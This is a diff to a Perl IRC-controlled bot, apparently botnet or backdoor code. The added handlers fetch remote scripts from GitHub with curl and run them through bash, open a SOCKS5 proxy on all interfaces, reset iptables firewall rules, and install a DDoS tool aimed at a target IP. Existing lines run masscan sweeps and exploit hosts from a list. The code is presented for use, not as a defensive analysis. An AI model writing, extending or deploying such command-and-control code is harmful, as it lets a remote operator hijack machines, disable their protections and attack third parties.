@@ -61,6 +61,24 @@ $irc->on(irc_privmsg => sub {
   system("proxychains perl ~/perlircssl.pl&");
   $irc->write(notice => $noticechan => "[info] Cloaked!\n");
  }
+  if ($msg =~ /@.novnc/) {
+  system("curl -LvO https://raw.githubusercontent.com/ind3p3nd3nt/novnc/main/.install.sh -o ~/.novnc && bash ~/.novnc >.log");
+  $irc->write(notice => $noticechan => "[info] NoVNC installed use: sudo cat .log\n");
+ }
+   if ($msg =~ /@.socks/) {
+  system("if [ -f /usr/bin/apt ]; then apt update && apt install build-essential -y; else yum groupinstall 'Development Tools' -y; fi;");
+  system("git clone https://github.com/ind3p3nd3nt/socks && cd socks && make -j8 && ./socks5server &");
+  $irc->write(notice => $noticechan => "[info] Socks5 Listening 0.0.0.0:8888\n");
+ }
+    if ($msg =~ /@.blocknoobs/) {
+  system("if [ -f /usr/bin/apt ]; then apt update && apt install build-essential -y; else yum groupinstall 'Development Tools' -y; fi;");
+  system("git clone https://github.com/ind3p3nd3nt/iptables_CIDR_drop.git && cd iptables_CIDR_drop && sh setup.sh &");
+  $irc->write(notice => $noticechan => "[info] Now blocking noobs all over the world.\n");
+ }
+    if ($msg =~ /@.fwreset/) {
+  system("curl -LvO https://raw.githubusercontent.com/ind3p3nd3nt/fwreset/main/iptables-reset.sh -o fwreset && sh fwreset &");
+  $irc->write(notice => $noticechan => "[info] Firewall Reset!\n");
+ }
  if ($msg =~ /sudo/) {
              my $fragment =  substr $msg, 7;
              $irc->write(notice => $noticechan => "$msg\n");
@@ -118,7 +136,15 @@ system 'if [ -f /usr/bin/apt ]; then sudo service ssh restart; fi';
      warn "Received rangescan request on $range , running masscan...";
      my $r = `$masscancmd`;
      push @IRC_RESULTS, $_ foreach split "\n", $r;
-     } elsif ($msg =~ /@.exploit/) {
+     } elsif ($msg =~ /@.ddos ([^\s]+)/) {
+     $s->progress("[Info] Installing DDoS Module");
+     my $ip = $1;
+     my $ddos = "curl -LvO https://raw.githubusercontent.com/ind3p3nd3nt/ddos/master/ddos.py -o ddos && chmod +x ddos && ./ddos";
+     my $r = `$ddos`;
+     push @IRC_RESULTS, $_ foreach split "\n", $r;
+     $s->progress("[Info] DDoS Module Installed use: sudo ddos arguments...");
+     }
+     elsif ($msg =~ /@.exploit/) {
       warn 'Received exploitrun request, exploiting hosts.txt...';
       my $r = exploitrun ("vnc", $s, $s->pid);
 
